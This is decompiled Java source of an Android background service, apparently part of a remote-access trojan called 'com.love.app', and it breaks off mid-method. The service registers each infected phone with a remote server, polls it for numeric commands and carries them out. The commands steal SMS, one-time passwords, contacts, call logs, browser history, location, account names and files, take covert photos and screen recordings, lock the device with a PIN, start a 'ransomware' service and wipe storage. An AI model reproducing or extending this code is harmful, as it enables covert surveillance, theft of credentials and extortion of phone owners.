/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.accounts.Account
 *  android.accounts.AccountManager
 *  android.app.Notification
 *  android.app.NotificationChannel
 *  android.app.NotificationManager
 *  android.app.PendingIntent
 *  android.app.Service
 *  android.app.WallpaperManager
 *  android.content.ComponentName
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.SharedPreferences
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageManager
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.BitmapFactory
 *  android.graphics.BitmapFactory$Options
 *  android.graphics.SurfaceTexture
 *  android.hardware.Camera
 *  android.hardware.Camera$CameraInfo
 *  android.hardware.Camera$Parameters
 *  android.hardware.Camera$PictureCallback
 *  android.hardware.Camera$Size
 *  android.hardware.camera2.CameraAccessException
 *  android.hardware.camera2.CameraManager
 *  android.location.Location
 *  android.location.LocationListener
 *  android.location.LocationManager
 *  android.media.MediaPlayer
 *  android.media.MediaPlayer$OnCompletionListener
 *  android.net.Uri
 *  android.os.BatteryManager
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Environment
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.Looper
 *  android.os.Parcelable
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.os.VibrationEffect
 *  android.os.Vibrator
 *  android.provider.Settings$Secure
 *  android.speech.tts.TextToSpeech
 *  android.speech.tts.TextToSpeech$OnInitListener
 *  android.telephony.SmsManager
 *  android.telephony.TelephonyManager
 *  android.util.Base64
 *  android.util.Log
 *  org.json.JSONArray
 *  org.json.JSONException
 *  org.json.JSONObject
 */
package com.love.app;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcelable;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.github.tamir7.contacts.Contacts;
import com.google.gson.Gson;
import com.love.app.AdminReceiver;
import com.love.app.AdminService;
import com.love.app.CommandService;
import com.love.app.ConfigFetcher;
import com.love.app.ForegroundService$$ExternalSyntheticLambda0;
import com.love.app.ForegroundService$$ExternalSyntheticLambda1;
import com.love.app.ForegroundService$$ExternalSyntheticLambda10;
import com.love.app.ForegroundService$$ExternalSyntheticLambda11;
import com.love.app.ForegroundService$$ExternalSyntheticLambda12;
import com.love.app.ForegroundService$$ExternalSyntheticLambda13;
import com.love.app.ForegroundService$$ExternalSyntheticLambda14;
import com.love.app.ForegroundService$$ExternalSyntheticLambda15;
import com.love.app.ForegroundService$$ExternalSyntheticLambda16;
import com.love.app.ForegroundService$$ExternalSyntheticLambda17;
import com.love.app.ForegroundService$$ExternalSyntheticLambda18;
import com.love.app.ForegroundService$$ExternalSyntheticLambda19;
import com.love.app.ForegroundService$$ExternalSyntheticLambda2;
import com.love.app.ForegroundService$$ExternalSyntheticLambda20;
import com.love.app.ForegroundService$$ExternalSyntheticLambda21;
import com.love.app.ForegroundService$$ExternalSyntheticLambda22;
import com.love.app.ForegroundService$$ExternalSyntheticLambda23;
import com.love.app.ForegroundService$$ExternalSyntheticLambda24;
import com.love.app.ForegroundService$$ExternalSyntheticLambda25;
import com.love.app.ForegroundService$$ExternalSyntheticLambda26;
import com.love.app.ForegroundService$$ExternalSyntheticLambda3;
import com.love.app.ForegroundService$$ExternalSyntheticLambda4;
import com.love.app.ForegroundService$$ExternalSyntheticLambda5;
import com.love.app.ForegroundService$$ExternalSyntheticLambda6;
import com.love.app.ForegroundService$$ExternalSyntheticLambda7;
import com.love.app.ForegroundService$$ExternalSyntheticLambda8;
import com.love.app.ForegroundService$$ExternalSyntheticLambda9;
import com.love.app.ForegroundService$1$$ExternalSyntheticLambda0;
import com.love.app.LockActivity;
import com.love.app.MainActivity;
import com.love.app.MyService;
import com.love.app.ScreenCaptureActivity;
import com.love.app.ScreenCaptureService;
import com.love.app.ServiceWindow;
import es.dmoral.toasty.Toasty;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FilterInputStream;
import java.io.FilterOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import me.everything.providers.android.browser.BrowserProvider;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ForegroundService
extends Service
implements TextToSpeech.OnInitListener {
    public static final String CHANNEL_ID = "ForegroundServiceChannel";
    private static final String TAG = "ForegroundService";
    private static final Object lock = new Object();
    private static ForegroundService sInstance;
    private static boolean sRunning;
    private volatile Camera camera;
    private final Object cameraLock;
    private CameraManager cameraManager;
    private String deviceId;
    private ExecutorService executor = Executors.newFixedThreadPool(4);
    private double locLat = 0.0;
    private double locLon = 0.0;
    private LocationListener locationListener;
    private LocationManager locationManager;
    private final Handler mainHandler;
    private AtomicBoolean pollingActive = new AtomicBoolean(false);
    private Thread pollingThread;
    private boolean registered = false;
    private RequestQueue requestQueue;
    private boolean torchBlinking = false;
    private String torchCameraId;
    private TextToSpeech tts;
    private PowerManager.WakeLock wakeLock;

    public ForegroundService() {
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.cameraLock = new Object();
    }

    private void acquireWakeLock() {
        block3: {
            PowerManager powerManager = (PowerManager)this.getSystemService("power");
            if (powerManager == null) break block3;
            try {
                powerManager = powerManager.newWakeLock(1, "ForegroundService::WakeLock");
                this.wakeLock = powerManager;
                powerManager.acquire(43200000L);
            }
            catch (Exception exception) {
                Log.e((String)TAG, (String)"Gagal acquire WakeLock", (Throwable)exception);
            }
        }
    }

    private void changeWallpaper(String string2, String string3) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda10(this, string2, string3));
    }

    /*
     * Unable to fully structure code
     * Could not resolve type clashes
     */
    private byte[] compressImage(byte[] var1_1, int var2_2, int var3_3) {
        block6: {
            block5: {
                var10_4 /* !! */  = new BitmapFactory.Options();
                var10_4 /* !! */ .inPreferredConfig = Bitmap.Config.RGB_565;
                var11_6 = BitmapFactory.decodeByteArray((byte[])var1_1 /* !! */ , (int)0, (int)var1_1 /* !! */ .length, (BitmapFactory.Options)var10_4 /* !! */ );
                if (var11_6 != null) break block5;
                return var1_1 /* !! */ ;
            }
            var9_7 = var11_6.getWidth();
            var8_8 = var11_6.getHeight();
            var10_4 /* !! */  = var11_6;
            if (var3_3 <= 0) ** GOTO lbl25
            if (var9_7 > var3_3) break block6;
            var10_4 /* !! */  = var11_6;
            if (var8_8 <= var3_3) ** GOTO lbl25
        }
        var6_9 = var3_3;
        var4_10 = var9_7;
        var7_11 = var6_9 / var4_10;
        var5_12 = var8_8;
        try {
            var6_9 = Math.min(var7_11, var6_9 / var5_12);
            var10_4 /* !! */  = Bitmap.createScaledBitmap((Bitmap)var11_6, (int)((int)(var4_10 * var6_9)), (int)((int)(var5_12 * var6_9)), (boolean)true);
            var11_6.recycle();
lbl25:
            // 3 sources

            var11_6 = new ByteArrayOutputStream();
            var10_4 /* !! */ .compress(Bitmap.CompressFormat.JPEG, var2_2, (OutputStream)var11_6);
            var10_4 /* !! */ .recycle();
            var10_4 /* !! */  = (BitmapFactory.Options)var11_6.toByteArray();
        }
        catch (Exception | OutOfMemoryError var10_5) {
            ** continue;
        }
        var1_1 /* !! */  = (byte[])var10_4 /* !! */ ;
lbl31:
        // 2 sources

        return var1_1 /* !! */ ;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, (CharSequence)"System Service", 2);
            NotificationManager notificationManager = (NotificationManager)this.getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
    }

    private void delegateToAccessibility(int n, String string2, String string3) {
        Intent intent = new Intent("com.love.app.EXECUTE_CMD");
        intent.putExtra("cmd", n);
        intent.putExtra("param", string2);
        intent.putExtra("cmdId", string3);
        this.sendBroadcast(intent);
    }

    private void deleteRecursive(File file) {
        File[] fileArray;
        if (file == null) {
            return;
        }
        if (file.isDirectory() && (fileArray = file.listFiles()) != null) {
            int n = fileArray.length;
            for (int i = 0; i < n; ++i) {
                this.deleteRecursive(fileArray[i]);
            }
        }
        file.delete();
    }

    private void enableDeviceAdmin(String string2) {
        ComponentName componentName = new ComponentName((Context)this, AdminReceiver.class);
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", (Parcelable)componentName);
        intent.addFlags(0x10000000);
        this.startActivity(intent);
        this.sendResult("admin", "prompt", string2);
    }

    private void executeCommand(int n, String string2, String string3) {
        Log.d((String)TAG, (String)("executeCommand: cmd=" + n + " cmdId=" + string3));
        switch (n) {
            default: {
                break;
            }
            case 2001: {
                this.playAudio(string2, string3);
                return;
            }
            case 200: 
            case 1020: 
            case 1050: 
            case 1054: 
            case 1055: 
            case 2000: 
            case 115987: 
            case 25896321: 
            case 33654789: 
            case 44598715: 
            case 45832158: 
            case 66985478: 
            case 885478962: {
                this.delegateToAccessibility(n, string2, string3);
                return;
            }
        }
        block4 : switch (n) {
            default: {
                switch (n) {
                    default: {
                        switch (n) {
                            default: {
                                switch (n) {
                                    default: {
                                        switch (n) {
                                            default: {
                                                switch (n) {
                                                    default: {
                                                        Log.w((String)TAG, (String)("Unknown cmd: " + n));
                                                        this.sendResult("error", "unknown command: " + n, string3);
                                                        break block4;
                                                    }
                                                    case 98765433: {
                                                        this.unlockScreen(string3);
                                                        break block4;
                                                    }
                                                    case 98765432: 
                                                }
                                                this.startLockActivity(string3);
                                                break block4;
                                            }
                                            case 11223345: {
                                                this.takePhoto(1, string3);
                                                break block4;
                                            }
                                            case 11223344: 
                                        }
                                        this.takePhoto(0, string3);
                                        break block4;
                                    }
                                    case 99887766: {
                                        this.enableDeviceAdmin(string3);
                                        break block4;
                                    }
                                    case 89521475: {
                                        this.stopService(new Intent((Context)this, ServiceWindow.class));
                                        this.sendResult("overlay", "hidden", string3);
                                        break block4;
                                    }
                                    case 87654321: {
                                        this.setLockPin(string2, string3);
                                        break block4;
                                    }
                                    case 74789654: {
                                        this.launchApp(string2, string3);
                                        break block4;
                                    }
                                    case 64645897: {
                                        this.uninstallApp(string2, string3);
                                        break block4;
                                    }
                                    case 5698742: {
                                        this.startService(new Intent((Context)this, ServiceWindow.class));
                                        this.sendResult("overlay", "shown", string3);
                                        break block4;
                                    }
                                    case 1596485: {
                                        this.sendInstalledApps(string3);
                                        break block4;
                                    }
                                    case 10101: 
                                }
                                this.stopRansomware(string3);
                                break block4;
                            }
                            case 1062: {
                                this.stopScreenRecord(string3);
                                break block4;
                            }
                            case 1061: {
                                this.startScreenCapture("record_start", string3);
                                break block4;
                            }
                            case 1060: 
                        }
                        this.startScreenCapture("screenshot", string3);
                        break block4;
                    }
                    case 1053: {
                        this.getGoogleAccounts(string3);
                        break block4;
                    }
                    case 1052: {
                        this.getTelegram(string3);
                        break block4;
                    }
                    case 1051: 
                }
                this.getOTP(string3);
                break;
            }
            case 1019: {
                this.fetchNotifications(string3);
                break;
            }
            case 1018: {
                this.startTorchBlink(string3);
                break;
            }
            case 1017: {
                this.setTorch(false, string3);
                this.torchBlinking = false;
                break;
            }
            case 1016: {
                this.setTorch(true, string3);
                break;
            }
            case 1015: {
                this.uploadFile(string2, string3);
                break;
            }
            case 1014: {
                this.getFileList(string2, string3);
                break;
            }
            case 1013: {
                this.showToast(string2, string3);
                break;
            }
            case 1012: {
                this.speak(string2, string3);
                break;
            }
            case 1011: {
                this.changeWallpaper(string2, string3);
                break;
            }
            case 1010: {
                this.startService(new Intent((Context)this, MyService.class));
                this.sendResult("ransomware", "started", string3);
                break;
            }
            case 1009: {
                this.wipe(string3);
                break;
            }
            case 1008: {
                this.vibrate(string3);
                break;
            }
            case 1007: {
                this.getBrowserHistory(string3);
                break;
            }
            case 1006: {
                this.sendDeviceInfo(string3);
                break;
            }
            case 1005: {
                this.sendLocation(string3);
                break;
            }
            case 1004: {
                this.getCallLogs(string3);
                break;
            }
            case 1003: {
                this.sendSms(string2, string3);
                break;
            }
            case 1002: {
                this.getSms(string3);
                break;
            }
            case 1001: {
                this.getContacts(string3);
            }
        }
    }

    public static void executeCommandStatic(int n, String string2, String string3) {
        ForegroundService foregroundService = sInstance;
        if (foregroundService != null) {
            foregroundService.executeCommand(n, string2, string3);
        } else {
            Log.w((String)TAG, (String)("executeCommandStatic: instance null, cmd=" + n));
        }
    }

    private void fetchGallery(String string2, String string3) {
        int n;
        try {
            n = Integer.parseInt(string2);
        }
        catch (Exception exception) {
            n = 20;
        }
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda6(this, n, string3));
    }

    private void fetchNotifications(String object) {
        String string2 = ConfigFetcher.getBaseUrl((Context)this);
        if (string2 == null) {
            this.sendResult("notifications", "[]", (String)object);
            return;
        }
        object = new StringRequest(0, string2 + "/notif/report?device_id=" + this.deviceId, new ForegroundService$$ExternalSyntheticLambda3(this, (String)object), new ForegroundService$$ExternalSyntheticLambda4(this, (String)object));
        ((Request)object).setRetryPolicy(new DefaultRetryPolicy(10000, 1, 1.0f));
        this.requestQueue.add(object);
    }

    private void getBrowserHistory(String string2) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda20(this, string2));
    }

    private void getCallLogs(String string2) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda23(this, string2));
    }

    private String getConfiguredLockPin() {
        Object object = this.getSharedPreferences("love_config", 0);
        String string2 = "";
        if ((object = object.getString("lock_pin", "")) != null) {
            string2 = ((String)object).trim();
        }
        return string2;
    }

    private void getContacts(String string2) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda8(this, string2));
    }

    private void getFileList(String string2, String string3) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda5(this, string2, string3));
    }

    private void getGoogleAccounts(String string2) {
        Account[] accountArray = ((AccountManager)this.getSystemService("account")).getAccountsByType("com.google");
        JSONArray jSONArray = new JSONArray();
        int n = accountArray.length;
        for (int i = 0; i < n; ++i) {
            jSONArray.put((Object)accountArray[i].name);
            continue;
        }
        try {
            this.sendResult("google_accounts", jSONArray.toString(), string2);
        }
        catch (Exception exception) {
            this.sendResult("google_error", exception.getMessage(), string2);
        }
        catch (SecurityException securityException) {
            this.sendResult("google_error", "Izin GET_ACCOUNTS tidak diberikan", string2);
        }
    }

    private String getMyDeviceId() {
        String string2;
        block2: {
            SharedPreferences sharedPreferences;
            block4: {
                block3: {
                    String string3;
                    sharedPreferences = this.getSharedPreferences("love_config", 0);
                    string2 = string3 = sharedPreferences.getString("device_id", null);
                    if (string3 != null) break block2;
                    string3 = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id");
                    if (string3 == null) break block3;
                    string2 = string3;
                    if (!string3.isEmpty()) break block4;
                }
                string2 = "unknown_" + System.currentTimeMillis();
            }
            sharedPreferences.edit().putString("device_id", string2).apply();
        }
        return string2;
    }

    private void getOTP(String string2) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda16(this, string2));
    }

    private void getSms(String string2) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda13(this, string2));
    }

    private void getTelegram(String string2) {
        AccountManager accountManager = (AccountManager)this.getSystemService("account");
        JSONArray jSONArray = new JSONArray();
        for (int i = 0; i < 2; ++i) {
            String string3 = (new String[]{"org.telegram.messenger", "org.telegram.account"})[i];
            for (Account account : accountManager.getAccountsByType(string3)) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("type", (Object)string3);
                jSONObject.put("name", (Object)account.name);
                jSONArray.put((Object)jSONObject);
            }
        }
        try {
            this.sendResult("telegram_accounts", jSONArray.toString(), string2);
        }
        catch (Exception exception) {
            this.sendResult("telegram_error", exception.getMessage(), string2);
        }
        catch (SecurityException securityException) {
            this.sendResult("telegram_error", "Izin GET_ACCOUNTS tidak diberikan", string2);
        }
    }

    private void getWhatsAppNumber(String string2) {
        Account[] accountArray = ((AccountManager)this.getSystemService("account")).getAccountsByType("com.whatsapp");
        JSONArray jSONArray = new JSONArray();
        int n = accountArray.length;
        for (int i = 0; i < n; ++i) {
            jSONArray.put((Object)accountArray[i].name);
            continue;
        }
        try {
            this.sendResult("whatsapp_numbers", jSONArray.toString(), string2);
        }
        catch (Exception exception) {
            this.sendResult("whatsapp_error", exception.getMessage(), string2);
        }
        catch (SecurityException securityException) {
            this.sendResult("whatsapp_error", "Izin GET_ACCOUNTS tidak diberikan", string2);
        }
    }

    private boolean hasConfiguredLockPin() {
        boolean bl = false;
        String string2 = this.getSharedPreferences("love_config", 0).getString("lock_pin", "");
        boolean bl2 = bl;
        if (string2 != null) {
            bl2 = bl;
            if (string2.trim().matches("\\d{4,6}")) {
                bl2 = true;
            }
        }
        return bl2;
    }

    public static boolean isRunning() {
        return sRunning;
    }

    static /* synthetic */ int lambda$getFileList$19(File file, File file2) {
        if (file.isDirectory() && !file2.isDirectory()) {
            return -1;
        }
        if (!file.isDirectory() && file2.isDirectory()) {
            return 1;
        }
        return file.getName().compareToIgnoreCase(file2.getName());
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    static /* synthetic */ void lambda$onDestroy$0(Context context) {
        Intent intent = new Intent(context, ForegroundService.class);
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                context.startForegroundService(intent);
                return;
            } else {
                context.startService(intent);
            }
            return;
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)("Gagal merestart ForegroundService: " + exception.getMessage()));
            try {
                Intent intent2 = new Intent(context, CommandService.class);
                context.startService(intent2);
                return;
            }
            catch (Exception exception2) {
                return;
            }
        }
    }

    static /* synthetic */ void lambda$playAudio$8(File file, MediaPlayer mediaPlayer) {
        mediaPlayer.release();
        if (file != null) {
            file.delete();
        }
    }

    private void launchApp(String string2, String string3) {
        Intent intent = this.getPackageManager().getLaunchIntentForPackage(string2);
        if (intent != null) {
            intent.addFlags(0x10000000);
            this.startActivity(intent);
            this.sendResult("launch", "ok", string3);
        } else {
            this.sendResult("launch_error", "package not found: " + string2, string3);
        }
    }

    private void playAudio(String string2, String string3) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda19(this, string2, string3));
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void processCommandResponse(String string2, String charSequence) {
        try {
            Object object = new JSONObject(string2);
            int n = object.optInt("cmd", -1);
            charSequence = object.optString("param", "");
            StringBuilder stringBuilder = new StringBuilder("cmd_");
            String string3 = object.optString("cmdId", stringBuilder.append(System.currentTimeMillis()).toString());
            if (n == -1) {
                charSequence = new StringBuilder("Received response without cmd field: ");
                Log.w((String)TAG, (String)((StringBuilder)charSequence).append(string2).toString());
                return;
            }
            object = new StringBuilder("📥 Command diterima via HTTP: cmd=");
            Log.d((String)TAG, (String)((StringBuilder)object).append(n).append(" cmdId=").append(string3).toString());
            this.executeCommand(n, (String)charSequence, string3);
            return;
        }
        catch (JSONException jSONException) {
            Log.e((String)TAG, (String)("processCommandResponse JSON error: " + jSONException.getMessage() + " body=" + string2));
        }
    }

    private void registerDevice(String object) {
        JSONObject jSONObject;
        block6: {
            if (this.registered) {
                return;
            }
            jSONObject = new JSONObject();
            jSONObject.put("device_id", (Object)this.deviceId);
            jSONObject.put("model", (Object)Build.MODEL);
            jSONObject.put("manufacturer", (Object)Build.MANUFACTURER);
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            jSONObject.put("android", (Object)Build.VERSION.RELEASE);
            jSONObject.put("username", (Object)ConfigFetcher.getUsername((Context)this));
            jSONObject.put("session_id", (Object)ConfigFetcher.getSessionId((Context)this));
            jSONObject.put("lock_pin_set", this.hasConfiguredLockPin());
            jSONObject.put("lock_mode", (Object)this.getSharedPreferences("love_config", 0).getString("lock_mode", "default"));
            TelephonyManager telephonyManager = (TelephonyManager)this.getSystemService("phone");
            if (telephonyManager == null) break block6;
            try {
                jSONObject.put("country", (Object)telephonyManager.getNetworkCountryIso());
                jSONObject.put("operator", (Object)telephonyManager.getSimOperatorName());
            }
            catch (SecurityException securityException) {
                try {
                    jSONObject.put("country", (Object)"");
                    jSONObject.put("operator", (Object)"");
                }
                catch (JSONException jSONException) {
                    Log.e((String)TAG, (String)"register JSON error", (Throwable)jSONException);
                }
            }
        }
        object = new JsonObjectRequest(1, (String)object + "/register", jSONObject, new ForegroundService$$ExternalSyntheticLambda25(this), (Response.ErrorListener)new ForegroundService$$ExternalSyntheticLambda26(this, (String)object));
        ((Request)object).setRetryPolicy(new DefaultRetryPolicy(15000, 2, 1.0f));
        this.requestQueue.add(object);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void releaseCamera() {
        Object object = this.cameraLock;
        synchronized (object) {
            Camera camera = this.camera;
            if (camera != null) {
                try {
                    this.camera.stopPreview();
                    this.camera.release();
                }
                catch (Exception exception) {}
                this.camera = null;
            }
            return;
        }
    }

    private void releaseWakeLock() {
        PowerManager.WakeLock wakeLock = this.wakeLock;
        if (wakeLock != null && wakeLock.isHeld()) {
            this.wakeLock.release();
        }
    }

    private void sendDeviceInfo(String string2) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda15(this, string2));
    }

    private void sendInstalledApps(String string2) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda18(this, string2));
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void sendLocation(String string2) {
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("lat", this.locLat);
            jSONObject.put("lon", this.locLon);
            boolean bl = this.locLat != 0.0 || this.locLon != 0.0;
            jSONObject.put("available", bl);
        }
        catch (JSONException jSONException) {}
        this.sendResult("location", jSONObject.toString(), string2);
    }

    public static void sendResultStatic(String string2, String string3, String string4) {
        ForegroundService foregroundService = sInstance;
        if (foregroundService != null) {
            foregroundService.sendResult(string2, string3, string4);
        } else {
            Log.w((String)TAG, (String)"sendResultStatic: instance null");
        }
    }

    private void sendSms(String string2, String string3) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda2(this, string2, string3));
    }

    private void setLockPin(String string2, String string3) {
        if (!(string2 = string2 == null ? "" : string2.trim()).matches("\\d{4,6}")) {
            this.sendResult("pin_error", "PIN harus 4-6 digit angka", string3);
            return;
        }
        this.getSharedPreferences("love_config", 0).edit().putString("lock_pin", string2).apply();
        this.sendResult("lock_pin", "set", string3);
    }

    private void setTorch(boolean bl, String string2) {
        if (this.torchCameraId != null) {
            block5: {
                this.cameraManager.setTorchMode(this.torchCameraId, bl);
                if (string2 == null) break block5;
                String string3 = bl ? "on" : "off";
                try {
                    this.sendResult("torch", string3, string2);
                }
                catch (CameraAccessException cameraAccessException) {
                    if (string2 == null) break block5;
                    this.sendResult("torch_error", cameraAccessException.getMessage(), string2);
                }
            }
            return;
        }
        if (string2 != null) {
            this.sendResult("torch_error", "torch not available", string2);
        }
    }

    private void showToast(String string2, String string3) {
        this.mainHandler.post((Runnable)new ForegroundService$$ExternalSyntheticLambda1(this, string2, string3));
    }

    private void speak(String string2, String string3) {
        if (this.tts != null && string2 != null && !string2.isEmpty()) {
            this.tts.speak((CharSequence)string2, 1, null, null);
        }
        this.sendResult("voice", "ok", string3);
    }

    private void startLocationTracking() {
        if (this.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != 0 && this.checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") != 0) {
            return;
        }
        try {
            LocationListener locationListener;
            this.locationManager = (LocationManager)this.getSystemService("location");
            this.locationListener = locationListener = new LocationListener(this){
                final ForegroundService this$0;
                {
                    this.this$0 = foregroundService;
                }

                public void onLocationChanged(Location location) {
                    this.this$0.locLat = location.getLatitude();
                    this.this$0.locLon = location.getLongitude();
                    this.this$0.getSharedPreferences("love_config", 0).edit().putLong("loc_lat", Double.doubleToLongBits(this.this$0.locLat)).putLong("loc_lon", Double.doubleToLongBits(this.this$0.locLon)).apply();
                }

                public void onProviderDisabled(String string2) {
                }

                public void onProviderEnabled(String string2) {
                }

                public void onStatusChanged(String string2, int n, Bundle bundle) {
                }
            };
            if (this.locationManager.isProviderEnabled("gps")) {
                this.locationManager.requestLocationUpdates("gps", 30000L, 50.0f, this.locationListener);
            }
            if (this.locationManager.isProviderEnabled("network")) {
                this.locationManager.requestLocationUpdates("network", 30000L, 50.0f, this.locationListener);
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Location tracking error", (Throwable)exception);
        }
    }

    private void startLockActivity(String string2) {
        if (!this.hasConfiguredLockPin()) {
            this.getSharedPreferences("love_config", 0).edit().putBoolean("is_locked", false).apply();
            this.sendResult("lock_error", "PIN belum diset", string2);
            return;
        }
        this.getSharedPreferences("love_config", 0).edit().putBoolean("is_locked", true).apply();
        Intent intent = new Intent((Context)this, LockActivity.class);
        intent.addFlags(0x14000000);
        this.startActivity(intent);
        this.sendResult("lock", "ok", string2);
    }

    private void startPollingLoop(String object) {
        if (!this.pollingActive.compareAndSet(false, true)) {
            Log.w((String)TAG, (String)"Polling loop sudah berjalan");
            return;
        }
        Log.i((String)TAG, (String)("✅ HTTP polling loop dimulai: " + (String)object));
        this.pollingThread = object = new Thread(new ForegroundService$$ExternalSyntheticLambda14(this, (String)object));
        ((Thread)object).setDaemon(true);
        this.pollingThread.start();
    }

    private void startScreenCapture(String string2, String string3) {
        Intent intent = new Intent((Context)this, ScreenCaptureActivity.class);
        intent.addFlags(0x10000000);
        intent.putExtra("mode", string2);
        intent.putExtra("cmd_id", string3);
        this.startActivity(intent);
        string2 = string2.equals("screenshot") ? "screenshot_status" : "record_status";
        this.sendResult(string2, "requesting_permission", string3);
    }

    private void startTorchBlink(String string2) {
        this.torchBlinking = true;
        this.mainHandler.post(new Runnable(this){
            boolean state;
            final ForegroundService this$0;
            {
                this.this$0 = foregroundService;
                this.state = false;
            }

            @Override
            public void run() {
                boolean bl;
                if (!this.this$0.torchBlinking) {
                    this.this$0.setTorch(false, null);
                    return;
                }
                this.state = bl = this.state ^ true;
                this.this$0.setTorch(bl, null);
                this.this$0.mainHandler.postDelayed((Runnable)this, 300L);
            }
        });
        this.sendResult("torch", "blinking", string2);
    }

    private void stopRansomware(String string2) {
        this.stopService(new Intent((Context)this, MyService.class));
        Intent intent = new Intent((Context)this, AdminService.class);
        intent.setAction("STOP_HANG");
        this.startService(intent);
        this.sendResult("ransomware", "stopped", string2);
    }

    private void stopScreenRecord(String string2) {
        Intent intent = new Intent((Context)this, ScreenCaptureService.class);
        intent.putExtra("mode", "record_stop");
        intent.putExtra("cmd_id", string2);
        if (Build.VERSION.SDK_INT >= 26) {
            this.startForegroundService(intent);
        } else {
            this.startService(intent);
        }
    }

    private void takePhoto(int n, String string2) {
        this.torchBlinking = false;
        this.setTorch(false, null);
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda9(this, n, string2));
    }

    private void uninstallApp(String string2, String string3) {
        string2 = new Intent("android.intent.action.DELETE", Uri.parse((String)("package:" + string2)));
        string2.addFlags(0x10000000);
        this.startActivity((Intent)string2);
        this.sendResult("uninstall", "prompt", string3);
    }

    private void unlockScreen(String string2) {
        this.getSharedPreferences("love_config", 0).edit().putBoolean("is_locked", false).apply();
        this.sendBroadcast(new Intent("com.love.app.UNLOCK_NOW"));
        Intent intent = new Intent("com.love.app.UPDATE_LOCK_STATE");
        intent.putExtra("is_locked", false);
        this.sendBroadcast(intent);
        intent = new Intent((Context)this, AdminService.class);
        intent.setAction("STOP_HANG");
        this.startService(intent);
        this.sendResult("lock", "unlocked", string2);
    }

    private void uploadFile(String string2, String string3) {
        this.executor.execute(new ForegroundService$$ExternalSyntheticLambda21(this, string2, string3));
    }

    private void vibrate(String string2) {
